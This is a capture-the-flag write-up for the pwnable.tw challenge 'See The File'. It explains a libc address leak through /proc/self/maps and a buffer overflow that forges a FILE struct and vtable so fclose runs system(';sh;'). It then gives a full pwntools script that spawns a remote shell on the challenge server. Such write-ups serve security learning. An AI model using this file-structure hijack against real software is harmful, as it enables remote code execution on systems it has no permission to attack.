# See The File
> LongChampion, 26/03/2020

## Ideal
- First, we read `/proc/self/maps` to leak `libc_base` (this is an awesome trick)
- Then, we overflow `name` variable to create a fake `vtable` and a fake `FILE struct`
- Change in memory layout is explainted as below:
```
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|           your_name(32 bytes)           | fp (4 bytes) | other segments                           |   old layout
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
| fake vtable (contains only system_addr) | fake_fp_ptr  | fake FILE struct (76 bytes) | vtable_ptr |   new layout
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
    ^                                            |          ^                                 |
    |                                            `- - - - - '                                 |
    `- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -'
```
- When `fclose` is called, it will look at our fake `FILE struct`, then dereference our fake `vtable` via fake `vtable_ptr` at the end of `FILE struct`.
- Because we have filled `vtable` with `system_addr` (or one_gadget if you want),  it will call `system(fake FILE struct)` no matter what function `fclose` really need to call.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

r = remote("chall.pwnable.tw", 10200)

name_addr = 0x0804B260
fp_addr = 0x0804B280
system_addr = 0x0003A940


def Open(filename):
    r.sendlineafter("Your choice :", "1")
    r.sendlineafter("What do you want to see :", filename)
    text = r.recvuntil("MENU")
    return "Open Successful" in text


def Read():
    r.sendlineafter("Your choice :", "2")
    text = r.recvuntil("MENU")
    return "Read Successful" in text


def Show():
    r.sendlineafter("Your choice :", "3")


def Close():
    r.sendlineafter("Your choice :", "4")


Open("/proc/self/maps")
Read()
Show()
Read()
Show()
text = r.recvline_contains("libc").split('-')[0]
libc_base = int(text, 16)
log.info("libc_base: " + hex(libc_base))
Close()

system_addr += libc_base
myname = p32(system_addr) * 8 + p32(fp_addr + 4)
fake_fp = p32(0x80808080) + ";sh;\0\0\0\0" * 9 + p32(name_addr)
r.sendlineafter("Your choice :", "5")
r.sendlineafter("Leave your name :", myname+fake_fp)
r.interactive()
```
